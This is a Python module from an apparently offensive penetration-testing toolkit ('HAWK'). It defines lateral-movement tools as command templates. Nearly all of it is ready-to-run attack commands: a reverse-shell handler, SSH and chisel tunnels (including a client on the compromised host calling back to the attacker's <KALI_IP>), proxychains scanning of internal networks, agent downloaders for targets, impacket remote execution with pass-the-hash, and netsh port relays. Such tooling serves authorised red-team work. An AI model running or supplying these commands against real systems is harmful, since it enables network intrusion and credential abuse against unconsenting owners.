# HAWK — Hostile Assessment War-Kit
# Copyright 2026 Lorenzo Serafini
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# A copy of the License is provided in the LICENSE file at the root
# of this distribution, or at http://www.apache.org/licenses/LICENSE-2.0
#
# Attribution "Created by Lorenzo Serafini" must be preserved in all
# redistributed and Derivative Works — see NOTICE for details.

"""
HAWK - Phase 7: Lateral Movement
Pivoting, tunneling, network traversal.
"""

from modules.base import BaseModule, Tool


class LateralModule(BaseModule):

    PHASE_ID   = "lateral"
    PHASE_NAME = "LATERAL MOVEMENT"

    TOOLS = [

        # ── 🐧 LINUX / GENERAL ──────────────────────────────────────────────

        Tool(
            id="penelope",
            name="PENELOPE",
            desc=("Advanced reverse-shell handler with auto PTY upgrade, "
                  "file transfer, session logging and script upload.  "
                  "Modern replacement for pwncat-cs (which broke on "
                  "Python 3.12+ upstream).  Runs in an xterm so the "
                  "listener stays interactive; the operator sets the "
                  "listen port in the dialog."),
            cmd_template="penelope {extra}",
            binary="penelope",
            category="shell",
            os_hint="linux",
        ),
        Tool(
            id="sshuttle",
            name="SSHUTTLE",
            desc=("Transparent SSH tunnel — routes Kali traffic through a "
                  "Linux pivot without configuring proxychains on each "
                  "tool.  Needs SSH creds for the pivot + Python on the "
                  "pivot; requires sudo on Kali for the transparent-"
                  "proxy iptables rules.  Preferred over chisel on very "
                  "old kernels (< 2.6.27) where the Go-built chisel "
                  "client crashes with \"netpollinit failed\".  Set "
                  "custom_args to the SSH username (e.g. msfadmin)."),
            cmd_template="sshuttle -r {extra}@{target} 0/0 --dns",
            binary="sshuttle",
            category="tunnel",
            os_hint="linux",
            requires_sudo=True,
        ),
        Tool(
            id="ssh_local_fw",
            name="SSH Local Fwd",
            desc="SSH local port forward — reach internal services through pivot",
            cmd_template="ssh -L 8080:{target}:80 {extra}",
            binary="ssh",
            category="ssh",
            os_hint="linux",
        ),
        Tool(
            id="ssh_dynamic",
            name="SSH Dynamic (SOCKS5)",
            desc="SSH dynamic SOCKS5 proxy on port 1080 — chain with proxychains",
            cmd_template="ssh -D 1080 -f -N {extra}@{target}",
            binary="ssh",
            category="ssh",
            os_hint="linux",
        ),
        Tool(
            id="chisel_server",
            name="CHISEL Server",
            desc="Start chisel reverse tunnel server (port 9000) — run on Kali",
            cmd_template="chisel server --port 9000 --reverse",
            binary="chisel",
            category="tunnel",
            os_hint="any",
        ),
        Tool(
            id="chisel_client",
            name="CHISEL Client (Linux)",
            desc="Chisel reverse tunnel — run on Linux pivot box",
            cmd_template="chisel client <KALI_IP>:9000 R:socks",
            binary="chisel",
            category="tunnel",
            os_hint="linux",
            runs_on_target=True,
        ),
        Tool(
            id="proxychains_scan",
            name="PROXYCHAINS NMAP",
            desc=("Route nmap through a SOCKS5 proxy to reach internal networks "
                  "that Kali cannot access directly — used after pivoting onto a "
                  "compromised host.  HOW IT WORKS: proxychains4 intercepts every "
                  "TCP syscall nmap makes and tunnels it through the configured "
                  "SOCKS proxy (set via the PROXY button at the top of HAWK).  "
                  "Traffic exits from the pivot host — not from Kali — providing "
                  "a layer of source anonymisation.  "
                  "PREREQUISITES: (1) a SOCKS5 tunnel running on Kali "
                  "(SSH Dynamic port 1080, chisel R:socks, or ligolo-ng); "
                  "(2) /etc/proxychains4.conf pointing at that tunnel — use "
                  "the PROXY button to configure it.  "
                  "-sT (TCP connect) and -Pn are mandatory: proxychains cannot "
                  "forward raw IP packets or ICMP, only full TCP connections."),
            cmd_template="proxychains4 nmap -sT -Pn {target}",
            binary="proxychains4",
            category="proxy",
            os_hint="any",
        ),
        Tool(
            id="ligolo_download",
            name="LIGOLO-NG (download)",
            desc=("Download ligolo-ng proxy (Kali) + agents (both amd64 "
                  "AND i386 for 32-bit legacy targets like MS2) — "
                  "modern alternative to chisel.  Files land in "
                  "payloads/."),
            # `{payloads}` resolves to <HAWK>/payloads/ — a bare `-o name`
            # would drop both binaries in whatever directory HAWK was
            # started from.  Both 32- and 64-bit agents are fetched so
            # the operator can pick the right one after `uname -m` on
            # the target (mirrors the pspy32/pspy64 pattern).
            # ligolo-ng releases are gzipped tarballs with versioned
            # names (ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz), NOT raw
            # binaries — the previous "releases/latest/download/proxy_
            # linux_amd64" URL returned a 9-byte 404 page.  Same
            # GitHub-API-resolves-tag pattern as chisel_win_download,
            # extended for tar.gz extraction and both arches.
            cmd_template=(
                "VER=$(curl -fsSL "
                "https://api.github.com/repos/nicocha30/ligolo-ng/"
                "releases/latest | "
                "grep -oE '\"tag_name\"[[:space:]]*:[[:space:]]*"
                "\"v[^\"]+\"' | head -1 | grep -oE 'v[0-9][^\"]*') && "
                "V=${{VER#v}} && "
                "BASE=\"https://github.com/nicocha30/ligolo-ng/"
                "releases/download/${{VER}}\" && "
                "echo \"[+] Latest ligolo-ng: $VER\" && "
                "curl -fsSL -o {payloads}/_lg_proxy.tgz "
                "\"${{BASE}}/ligolo-ng_proxy_${{V}}_linux_amd64.tar.gz\" && "
                "tar -xzf {payloads}/_lg_proxy.tgz -C {payloads} && "
                "mv {payloads}/proxy {payloads}/ligolo-proxy && "
                "chmod +x {payloads}/ligolo-proxy && "
                "echo \"[+] ligolo-proxy ready\" && "
                "curl -fsSL -o {payloads}/_lg_agent64.tgz "
                "\"${{BASE}}/ligolo-ng_agent_${{V}}_linux_amd64.tar.gz\" && "
                "tar -xzf {payloads}/_lg_agent64.tgz -C {payloads} && "
                "mv {payloads}/agent {payloads}/ligolo-agent && "
                "chmod +x {payloads}/ligolo-agent && "
                "echo \"[+] ligolo-agent (amd64) ready\" && "
                # 32-bit agent is OPTIONAL: newer ligolo-ng versions
                # (v0.9.x+) dropped the linux/386 asset, and 32-bit
                # targets are rare in real engagements.  Fetch it best-
                # effort — a 404 or extract failure prints a note and
                # does NOT fail the download of the amd64 pair.
                "(curl -fsSL -o {payloads}/_lg_agent32.tgz "
                "\"${{BASE}}/ligolo-ng_agent_${{V}}_linux_386.tar.gz\" && "
                "tar -xzf {payloads}/_lg_agent32.tgz -C {payloads} && "
                "mv {payloads}/agent {payloads}/ligolo-agent-386 && "
                "chmod +x {payloads}/ligolo-agent-386 && "
                "echo \"[+] ligolo-agent-386 ready\") || "
                "echo \"[!] 32-bit agent not published for $VER — skipping\"; "
                "rm -f {payloads}/_lg_proxy.tgz "
                "{payloads}/_lg_agent64.tgz {payloads}/_lg_agent32.tgz && "
                "ls -la {payloads}/ligolo-*"
            ),
            binary="curl",
            category="tunnel",
            os_hint="linux",
        ),
        Tool(
            id="ligolo_proxy",
            name="LIGOLO-NG Proxy",
            desc="Start ligolo-ng proxy listener — selfcert, port 11601",
            cmd_template=("sudo {payloads}/ligolo-proxy -selfcert "
                          "-laddr 0.0.0.0:11601"),
            binary="ligolo-proxy",
            category="tunnel",
            requires_sudo=True,
            os_hint="linux",
        ),

        # ── 🪟 WINDOWS ──────────────────────────────────────────────────────

        Tool(
            id="evil_winrm",
            name="EVIL-WINRM",
            desc="WinRM shell on port 5985 — interactive PowerShell with upload/download",
            cmd_template="evil-winrm -i {target} -u {user} -p {password}",
            binary="evil-winrm",
            category="shell",
            os_hint="windows",
        ),
        Tool(
            id="impacket_exec",
            name="IMPACKET EXEC",
            desc=("Consolidated impacket-exec suite — one card, one auth "
                  "dialog, five execution methods selected at run time:\n\n"
                  "  psexec    SMB service install → SYSTEM shell.  "
                  "Noisiest (Event 7045, RemComSvc binary on disk).\n"
                  "  smbexec   SMB service + named-pipe shovel → SYSTEM.  "
                  "No binary drop, semi-interactive.\n"
                  "  wmiexec   WMI Win32_Process.Create → runs as the "
                  "authenticated user (NOT SYSTEM).  Small footprint.\n"
                  "  atexec    Task Scheduler single-shot → SYSTEM, "
                  "requires the command up-front (no shell).\n"
                  "  dcomexec  DCOM COM-object spawn (MMC20 / "
                  "ShellWindows / ShellBrowserWindow) → runs as the "
                  "authenticated user.\n\n"
                  "⚠ ALL METHODS REQUIRE LOCAL ADMIN on the target — "
                  "plain domain users get ACCESS_DENIED with no further "
                  "output.  Pass-the-hash (-hashes :NTHASH) works when "
                  "the NTLM hash is known from secretsdump / DCSync.  "
                  "The HAWK dialog surfaces method-specific extras "
                  "(atexec Command + -silentcommand ; wmiexec -nooutput ; "
                  "dcomexec -object) as chips / checkbox / dropdown."),
            # Informational template only — the real command is built at
            # runtime by _build_impacket_cmd() from the METHOD dropdown
            # + auth fields + method-specific extras.
            cmd_template="impacket-<method> {user}:{password}@{target}",
            binary="impacket-psexec",
            category="shell",
            os_hint="windows",
        ),
        Tool(
            id="rdp_connect",
            name="RDP Connect",
            desc="Connect via RDP — requires credentials or pass-the-hash",
            cmd_template="xfreerdp3 /v:{target} /u:{user} /p:{password} /cert:ignore /tls:seclevel:0 /dynamic-resolution",
            binary="xfreerdp3",
            category="shell",
            os_hint="windows",
        ),
        # rdp_enable used to live here as a stand-alone card that
        # just showed a copy-paste command; it was one dialog and
        # one click removed from where the operator actually needs
        # it (a failed RDP CONNECT).  The same reg + firewall
        # snippet is now embedded in the RDP Connect dialog itself
        # as a "Target RDP disabled?" section — see
        # gui/widgets/card_ad_routes.py :: _route_rdp_connect.
        Tool(
            id="chisel_win_download",
            name="Chisel (Windows, download)",
            desc=("Download chisel.exe for Windows to Kali, then transfer it to "
                  "the target and run it to connect back to the chisel server.  "
                  "Chisel release filenames include the version number so the URL "
                  "is resolved dynamically via the GitHub API."),
            cmd_template=(
                # Two API/asset changes to work around:
                #   1) GitHub now returns pretty-printed JSON with a
                #      space after `:` (e.g. `"tag_name": "v1.12.0"`);
                #      the old `"tag_name":"..."` (no space) pattern
                #      silently produced VER="" and the curl below
                #      tried to fetch `chisel__windows_amd64.gz`,
                #      exiting rc=1.  Same robust `[[:space:]]*`
                #      pattern the ligolo_download tool already uses.
                #   2) Since v1.12.0 the Windows assets are packaged
                #      as `.zip` (containing `chisel.exe` directly)
                #      instead of `.gz`; the previous URL yields 404.
                "VER=$(curl -fsSL https://api.github.com/repos/"
                "jpillora/chisel/releases/latest | "
                "grep -oE '\"tag_name\"[[:space:]]*:[[:space:]]*"
                "\"v[^\"]+\"' | head -1 | grep -oE 'v[0-9][^\"]*') "
                "&& curl -fsSL -L \"https://github.com/jpillora/chisel/"
                "releases/download/${VER}/chisel_${VER#v}_windows_amd64.zip\" "
                "-o {payloads}/chisel.zip "
                "&& unzip -o {payloads}/chisel.zip -d {payloads}/ "
                "&& rm -f {payloads}/chisel.zip"
            ),
            binary="curl",
            category="tunnel",
            os_hint="windows",
        ),
        Tool(
            id="netsh_portfwd",
            name="Netsh Port Forward",
            desc=("Windows built-in TCP port proxy — once inside the target shell "
                  "(meterpreter, evil-winrm, psexec), create a relay that forwards "
                  "any connection arriving on a target port to an internal host:port "
                  "that Kali cannot reach directly.  "
                  "Schema:  Kali → target:LISTEN_PORT → internal_host:CONNECT_PORT.  "
                  "No extra binaries needed — netsh is a Windows built-in.  "
                  "HAWK will ask for listen port, internal IP and connect port "
                  "before generating the command."),
            cmd_template=(
                "netsh interface portproxy add v4tov4 "
                "listenaddress=0.0.0.0 listenport=<LISTEN_PORT> "
                "connectaddress=<CONNECT_ADDRESS> connectport=<CONNECT_PORT>"
            ),
            binary="netsh",
            category="tunnel",
            os_hint="windows",
            runs_on_target=True,
        ),
    ]
